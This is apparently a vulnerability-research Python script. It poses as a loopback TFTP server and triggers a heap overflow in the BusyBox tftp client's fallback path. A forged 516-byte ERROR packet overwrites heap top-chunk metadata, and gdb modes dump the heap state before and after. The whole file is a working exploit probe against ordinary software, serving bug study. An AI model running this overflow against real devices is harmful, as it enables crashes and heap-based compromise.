#!/usr/bin/env python3
"""Loopback-only probe of the TFTP fallback overflow's heap-metadata effect.

Modes:
  layout   : gdb, stop after the first (short) read, dump rbuf/xbuf chunk
             metadata and ASLR-varying addresses, then quit.
  attack   : plain build, fallback forced by a 4-byte DATA block 0, then a
             516-byte ERROR packet whose bytes overwrite the top-chunk size
             field at rbuf+72.  The long error text makes BusyBox's
             bb_verror_msg call vasprintf -> malloc on the corrupted heap.
  control  : same 516-byte ERROR packet with no `-b 64` (io_bufsize=516 and
             rbuf=516 bytes from the start): no overflow, no corruption.
  attack-gdb : attack under gdb, dump the same metadata before/after the
             oversized read, then follow the input-triggered allocator abort.

All sockets bind 127.0.0.1 only.  No external host is contacted.
"""
import os
import re
import socket
import struct
import subprocess
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
BINARY = os.path.abspath(sys.argv[1]) if len(sys.argv) > 1 else os.path.join(HERE, "busybox-plain")
MODE = sys.argv[2] if len(sys.argv) > 2 else "attack"
TOP_SIZE = int(sys.argv[3], 0) if len(sys.argv) > 3 else 0x4141414141414141
assert MODE in ("layout", "attack", "control", "attack-gdb"), MODE

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.bind(("127.0.0.1", 0))
sock.settimeout(3)
port = sock.getsockname()[1]

use_gdb = MODE in ("layout", "attack-gdb")
small_blk = MODE != "control"
cmd = [BINARY, "tftp", "-g"]
if small_blk:
    cmd += ["-b", "64"]
cmd += ["-l", os.path.join(HERE, "heap-probe-out.bin"), "-r", "MISHE",
        "127.0.0.1", str(port)]

if use_gdb:
    gdb_cmds = os.path.join(HERE, "heap_probe.gdb")
    with open(gdb_cmds, "w") as f:
        f.write(
            "set disable-randomization off\n"
            "set pagination off\nset confirm off\nset print elements 0\n"
            "break tftp.c:604\nrun\n"
            "printf \"FIRST RBUF=%p XBUF=%p CHUNKSIZE=%#lx NEXT_SIZE=%#lx\\n\", "
            "rbuf, xbuf, *(unsigned long*)(rbuf-8), *(unsigned long*)(rbuf+72)\n"
        )
        if MODE == "attack-gdb":
            f.write(
                "continue\n"
                "printf \"SECOND IO_BUFSIZE=%d LEN=%d NEXT_SIZE=%#lx\\n\", "
                "io_bufsize, len, *(unsigned long*)(rbuf+72)\n"
                "x/12gx rbuf+64\n"
                "bt 4\n"
                "continue\n"
                "bt 6\n"
            )
        f.write("quit\n")
    proc = subprocess.Popen(
        ["gdb", "-q", "-batch", "-x", gdb_cmds, "--args"] + cmd,
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, cwd=HERE)
else:
    env = dict(os.environ)
    env["ASAN_OPTIONS"] = "detect_leaks=0:abort_on_error=0:halt_on_error=0"
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                            env=env, cwd=HERE)

req, peer = sock.recvfrom(2048)
print("REQ", repr(req))

if small_blk:
    # Not the expected OACK/block-1 DATA: forces io_bufsize=516 with rbuf=68.
    sock.sendto(struct.pack("!HH", 3, 0), peer)
    time.sleep(0.15)

# TFTP ERROR (opcode 5), 516 bytes on the wire.  A 511-byte NUL-free text
# forces bb_verror_msg() through vasprintf() -> malloc() after the read.
msg = bytearray(b"A" * 512)
msg[68:76] = struct.pack("<Q", TOP_SIZE)  # rbuf+72..79: next chunk's size
pkt = struct.pack("!HH", 5, 0) + bytes(msg)
assert len(pkt) == 516
sock.sendto(pkt, peer)

try:
    while True:
        sock.recvfrom(2048)
except socket.timeout:
    pass

out, err = proc.communicate(timeout=40)
text = (out + (err or b"")).decode("utf-8", "replace")
print("MODE", MODE, "TOP_SIZE", hex(TOP_SIZE), "RC", proc.returncode)
if use_gdb:
    for line in text.splitlines():
        if (re.search(r"FIRST |SECOND |0x[0-9a-f]{6,} |#\d |tftp\.c:|malloc|abort|SIGABRT|corrupt|inval", line)
                or "server error" in line or "falling back" in line):
            print("GDB", line[:300])
else:
    print("STDERR", text[-2500:])
sock.close()
sys.exit(0 if ("falling back" in text or MODE == "control") else 1)
